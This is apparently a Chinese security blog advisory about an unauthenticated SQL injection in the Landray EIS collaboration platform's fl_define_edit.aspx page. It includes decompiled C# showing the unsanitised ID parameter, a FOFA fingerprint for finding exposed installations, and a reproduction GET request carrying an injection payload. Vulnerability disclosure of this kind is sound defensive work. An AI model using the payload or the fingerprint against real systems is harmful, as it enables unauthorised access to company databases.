---
title: "蓝凌智慧协同平台 fl_define_edit.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/landray-eis-fl_define_edit-sqli.html
asset_dir: assets/蓝凌智慧协同平台-fl_define_edit.aspx-sql注入漏洞
---

# 蓝凌智慧协同平台 fl\_define\_edit.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/1/10 08:20
- 1501浏览
- [0评论](#comment)
- 15分钟阅读

深入探索

数据库

SQL

sql

---

# 简介

蓝凌EIS智慧协同平台是一款专为成长型企业打造的智慧办公云平台，深度融合了阿里钉钉的功能。该平台旨在通过增强组织的协同在线、业务在线和生态在线，提升企业的工作效率和管理便捷性。 [蓝凌](https://mrxn.net/tag/%E8%93%9D%E5%87%8C "蓝凌")EIS智慧协同平台 `fl_define_edit.aspx`存在SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")，未授权攻击者可利用该漏洞获取数据库敏感数据。

SQL注入检测工具

# 影响版本

Landray EIS 2001年至2006年的版本

# fofa语法

`body="/Scripts/jquery.landray.dialog.js" || icon_hash="953405444"`

# 漏洞分析

关键代码如下

```
protected override void Page_Load(object sender, EventArgs e)
    {
      string str1 = this.Request["ID"] == null ? "0" : this.Request["ID"];
      string str2 = this.Request.QueryString["assign_recordid"] == null ? "" : this.Request.QueryString["assign_recordid"];
      Org org = (Org) ((Control) this).Page.Session["Org"];
      this.FIOA_IMG_FOLDER = this.Request.Cookies["FIOA_IMG_FOLDER"].Value;
      this.Tree1.ConfigFile = "conf/fl_define_menu_tree_property.xml";
      this.Tree1.XMLDataFile = org["flowchar"].Equals((object) "SVG流程图") ? "conf/fl_define_menu_tree_svg.xml" : "conf/fl_define_menu_tree_data.xml";
      this.Tree1.PrmData = str1 + (string.op_Equality(str2, "") ? "" : "&assign_recordid=" + str2);
      ((Control) this.Tree1).DataBind();
      if (!string.op_Inequality(str1, "0"))
        return;
      object obj = (object) Landray.DataAccess.DataAccess.GetOneValue("SELECT name FROM OA_FLOW_DEFINE WHERE ID=" + str1).ToString();
      this.form_type = Landray.DataAccess.DataAccess.GetOneValue("SELECT form_type FROM OA_FLOW_DEFINE WHERE ID=" + str1).ToString();
    }
```

直接将 `ID` ==> str1 拼接进sql语句，造成[sql注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "sql注入")漏洞。

# 漏洞复现

```
GET /flow/fl_define_edit.aspx?ID=1%20and%201<CHAR(98)%2BCHAR(99)-- HTTP/1.1
Host: landray.mrxn.net
```

[[![蓝凌智慧协同平台 fl_define_edit.aspx SQL注入漏洞](images/img-001-cf904462dfd7.png)](https://mrxn.net/content/uploadfile/202501/b8f61736427227.png)](https://mrxn.net/content/uploadfile/202501/b8f61736427227.png)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#蓝凌](https://mrxn.net/tag/%E8%93%9D%E5%87%8C)

---

文章目录

- [1.简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
